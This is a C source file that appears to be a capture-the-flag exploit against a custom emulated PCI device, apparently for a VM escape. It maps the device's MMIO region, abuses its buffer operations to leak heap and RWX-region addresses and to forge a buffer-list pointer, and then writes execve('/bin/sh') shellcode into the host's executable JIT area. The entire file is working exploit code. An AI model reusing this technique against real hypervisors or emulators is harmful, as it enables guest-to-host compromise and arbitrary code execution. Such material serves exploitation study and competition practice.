// gcc exploit.c -masm=intel -nostdlib -no-pie -o exploit

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/mman.h>

ssize_t write(int fd, const void *buf, size_t count);
int open(const char* pathname, int flags, ...);
int close(int fd);
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
ssize_t pread(int fd, void *buf, size_t count, off_t offset);

void *memset(void *s, int c, size_t n);
void *memcpy(void *dest, const void *src, size_t n);
size_t strlen(const char *s);
static void dump(void *buf, size_t size);

void *memio;
#define IO_READ(addr)		(*(uint32_t*)(memio + (addr)))
#define IO_WRITE(addr, val)	*(uint32_t*)(memio + (addr)) = (val)

const uint64_t addr_gp_fun		= 0xfebf1000;
const uint64_t ofs_tcg_init_ctx	= 0x110d9c0;

static void fun_malloc(uint32_t size);
static void fun_free(void);
static void fun_tobuf(char idx, uint32_t src, uint32_t result_addr);
static void fun_frombuf(uint32_t dest, char idx, uint32_t result_addr);
static uintptr_t virt_to_phys_user(void *vaddr);

int _start(void){
	int fd;

	if((fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC)) < 0)
		return -1;

	if((memio = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)) == MAP_FAILED)
		return -1;

	uint64_t *vmem;
	uintptr_t pmem;
	if((vmem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0)) == MAP_FAILED)
		return -1;
	pmem = virt_to_phys_user(vmem);
	//printf("vmem : %p (pmem : %#lx)\n", vmem, pmem);

	fun_malloc(0x380);
	fun_frombuf(pmem, 0, addr_gp_fun + 0x18);

	uint64_t addr_heap_list = vmem[0x278/8];
	uint64_t addr_heap_base = addr_heap_list & ~0xffffff;
	//printf("[+] addr_heap_base = %#lx\n", addr_heap_base);

	uint64_t addr_rwx_area = vmem[0x330/8];
	//printf("[+] addr_rwx_area = %#lx\n", addr_rwx_area);

	vmem[0x400*1/8] = addr_heap_list;
	fun_malloc(0x800);
	fun_tobuf(1, pmem, addr_gp_fun + 0x18);

	struct BufList {
		size_t size;
		uintptr_t ptr[1];
	} list = {
		.size = 0x400,
		.ptr = { addr_rwx_area }
	};
	memcpy((void*)vmem + 0x400*2, &list, sizeof(list));

	fun_malloc(0x900);
	fun_tobuf(2, pmem, pmem+0xff0);

	char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
	memset(vmem, 0, 0x1000);
	memcpy((void*)vmem+0x16, shellcode, sizeof(shellcode));
	fun_tobuf(0, pmem, pmem+0xff0);

	close(fd);
}

static void fun_malloc(uint32_t size){
	IO_WRITE(0, size);
	IO_WRITE(0x14, 0);
}

static void fun_free(){
	IO_WRITE(0x18, 0);
}

static void fun_tobuf(char idx, uint32_t src, uint32_t result_addr){
	IO_WRITE(0x4, src);
	IO_WRITE(0x8, result_addr);
	IO_WRITE(0xc, idx);
	IO_WRITE(0x10, 0);
}

static void fun_frombuf(uint32_t dest, char idx, uint32_t result_addr){
	IO_WRITE(0x4, dest);
	IO_WRITE(0x8, result_addr);
	IO_WRITE(0xc, idx);
	int x = IO_READ(0x10);
}

typedef struct {
    uint64_t pfn : 55;
    unsigned int soft_dirty : 1;
    unsigned int file_page : 1;
    unsigned int swapped : 1;
    unsigned int present : 1;
} PagemapEntry;

/* Parse the pagemap entry for the given virtual address.
 *
 * @param[out] entry      the parsed entry
 * @param[in]  pagemap_fd file descriptor to an open /proc/pid/pagemap file
 * @param[in]  vaddr      virtual address to get entry for
 * @return 0 for success, 1 for failure
 */
static int pagemap_get_entry(PagemapEntry *entry, int pagemap_fd, uintptr_t vaddr){
    size_t nread;
    ssize_t ret;
    uint64_t data;
    uintptr_t vpn;

    vpn = vaddr / 0x1000;
    nread = 0;
    while (nread < sizeof(data)) {
        ret = pread(pagemap_fd, ((uint8_t*)&data) + nread, sizeof(data) - nread, vpn * sizeof(data) + nread);
        nread += ret;
        if (ret <= 0)
            return 1;
    }
    entry->pfn = data & (((uint64_t)1 << 55) - 1);
    entry->soft_dirty = (data >> 55) & 1;
    entry->file_page = (data >> 61) & 1;
    entry->swapped = (data >> 62) & 1;
    entry->present = (data >> 63) & 1;
    return 0;
}

/* Convert the given virtual address to physical using /proc/PID/pagemap.
 *
 * @param[in] vaddr virtual address to get entry for
 * @return physical address
 */
static uintptr_t virt_to_phys_user(void *vaddr){
    int pagemap_fd;

    pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
    if (pagemap_fd < 0) {
        return -1;
    }
    PagemapEntry entry;
    if (pagemap_get_entry(&entry, pagemap_fd, (uintptr_t)vaddr)) {
        return -1;
    }
    close(pagemap_fd);
    return (entry.pfn * 0x1000) + ((uintptr_t)vaddr % 0x1000);
}

/* utils */
void *memset(void *s, int c, size_t n){
	for(int i=0; i<n; i++)
		*(char*)(s+i) = (char)c;
	return s;
}

void *memcpy(void *dest, const void *src, size_t n){
	for(int i=0; i<n; i++)
		*(char*)(dest+i) = *(char*)(src+i);
	return dest;
}

size_t strlen(const char *s){
	uint64_t i;
	for(i=0; s[i]; i++);
	return i;
}

#ifdef USE_STDLIB
static void dump(void *buf, size_t size){
	uint64_t *p = buf;

	printf("=== DUMP (%p-%p) ===\n", buf, buf+size);
	for(uint64_t i=0; i<size/8; i++){
		printf("%016lx ", p[i]);
		if(i%4 == 3)
			printf("\n");
	}
	printf("\n");
}
#else
static void dump(void *buf, size_t size) {
	uint8_t *tb = buf;
	char sym[] = "0123456789abcdef";

	if (!tb)
		return;

	for (uint64_t i=0; i<size; i++) {
		write(1, &sym[(tb[i]&0xf0) >> 4], 1);
		write(1, &sym[(tb[i]&0x0f) >> 0], 1);
		write(1, " ", 1);
		if(i%16 == 15)
			write(1, " ", 1);
		if(i%64 == 63)
			write(1, "\n", 1);
	}
	write(1, "\n", 1);
}
#endif

asm(
"write:\n"
"mov rax, 1\n"
"syscall\n"
"ret\n"

"open:\n"
"mov rax, 2\n"
"syscall\n"
"ret\n"

"close:\n"
"mov rax, 3\n"
"syscall\n"
"ret\n"

"mmap:\n"
"mov rax, 9\n"
"mov r10, rcx\n"
"syscall\n"
"ret\n"

"pread:\n"
"mov rax, 17\n"
"mov r10, rcx\n"
"syscall\n"
"ret\n"
);
